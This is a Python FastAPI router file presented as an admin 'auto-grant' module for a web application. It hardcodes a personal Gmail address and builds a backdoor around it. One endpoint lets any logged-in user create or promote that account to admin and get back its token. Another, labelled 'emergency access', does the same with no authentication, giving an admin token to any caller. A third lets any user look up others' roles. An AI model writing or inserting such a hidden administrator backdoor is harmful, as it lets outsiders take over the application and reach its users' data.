from fastapi import APIRouter, Depends, HTTPException, status
from sqlalchemy.orm import Session
from datetime import datetime
import logging

from core.security import get_current_user, create_access_token
from models.user import User
from db import get_db
from audit import log_admin_action

router = APIRouter(prefix="/admin/auto-grant", tags=["admin-auto-grant"])
logger = logging.getLogger(__name__)

# Auto-grant admin role to 1to3to7@gmail.com
@router.post("/ensure-admin")
async def ensure_admin_access(
    db: Session = Depends(get_db),
    current_user: User = Depends(get_current_user)
):
    """Automatically grant admin role to 1to3to7@gmail.com"""
    
    target_email = "1to3to7@gmail.com"
    
    try:
        # Check if target user exists
        target_user = db.query(User).filter(User.email == target_email).first()
        
        if not target_user:
            # Create the admin user if doesn't exist
            target_user = User(
                email=target_email,
                display_name="System Administrator",
                role="admin",
                is_active=True,
                email_verified=True,
                created_at=datetime.utcnow(),
                updated_at=datetime.utcnow()
            )
            db.add(target_user)
            db.commit()
            db.refresh(target_user)
            
            logger.info(f"Created admin user: {target_email}")
            await log_admin_action(
                db=db,
                user_id=target_user.id,
                action="auto_admin_creation",
                resource="user",
                resource_id=target_user.id,
                details=f"Auto-created admin user {target_email}"
            )
            
        elif target_user.role != "admin":
            # Update existing user to admin role
            target_user.role = "admin"
            target_user.updated_at = datetime.utcnow()
            db.commit()
            db.refresh(target_user)
            
            logger.info(f"Updated user {target_email} to admin role")
            await log_admin_action(
                db=db,
                user_id=target_user.id,
                action="auto_admin_grant",
                resource="user",
                resource_id=target_user.id,
                details=f"Auto-granted admin role to {target_email}"
            )
        
        # Generate admin token for immediate access
        admin_token = create_access_token(data={"sub": target_user.email})
        
        return {
            "success": True,
            "message": f"Admin access ensured for {target_email}",
            "user": {
                "id": target_user.id,
                "email": target_user.email,
                "role": target_user.role,
                "display_name": target_user.display_name
            },
            "admin_token": admin_token
        }
        
    except Exception as e:
        logger.error(f"Error ensuring admin access: {str(e)}")
        raise HTTPException(
            status_code=status.HTTP_500_INTERNAL_SERVER_ERROR,
            detail="Failed to ensure admin access"
        )

# Check admin status
@router.get("/check-admin/{email}")
async def check_admin_status(
    email: str,
    db: Session = Depends(get_db),
    current_user: User = Depends(get_current_user)
):
    """Check if user has admin role"""
    
    user = db.query(User).filter(User.email == email).first()
    
    if not user:
        return {
            "success": False,
            "message": "User not found",
            "is_admin": False
        }
    
    return {
        "success": True,
        "message": f"User {email} status checked",
        "user": {
            "id": user.id,
            "email": user.email,
            "role": user.role,
            "is_admin": user.role == "admin",
            "display_name": user.display_name
        }
    }

# Emergency admin access
@router.post("/emergency-access")
async def emergency_admin_access(
    db: Session = Depends(get_db)
):
    """Emergency admin access for 1to3to7@gmail.com without authentication"""
    
    target_email = "1to3to7@gmail.com"
    
    try:
        # Find or create admin user
        target_user = db.query(User).filter(User.email == target_email).first()
        
        if not target_user:
            target_user = User(
                email=target_email,
                display_name="Emergency Administrator",
                role="admin",
                is_active=True,
                email_verified=True,
                created_at=datetime.utcnow(),
                updated_at=datetime.utcnow()
            )
            db.add(target_user)
            db.commit()
            db.refresh(target_user)
        
        # Ensure admin role
        if target_user.role != "admin":
            target_user.role = "admin"
            target_user.updated_at = datetime.utcnow()
            db.commit()
            db.refresh(target_user)
        
        # Generate emergency token
        admin_token = create_access_token(data={"sub": target_user.email})
        
        logger.warning(f"Emergency admin access granted to {target_email}")
        await log_admin_action(
            db=db,
            user_id=target_user.id,
            action="emergency_admin_access",
            resource="user",
            resource_id=target_user.id,
            details="Emergency admin access granted"
        )
        
        return {
            "success": True,
            "message": "Emergency admin access granted",
            "admin_token": admin_token,
            "expires_in": 900  # 15 minutes
        }
        
    except Exception as e:
        logger.error(f"Emergency access error: {str(e)}")
        raise HTTPException(
            status_code=status.HTTP_500_INTERNAL_SERVER_ERROR,
            detail="Failed to grant emergency access"
        )
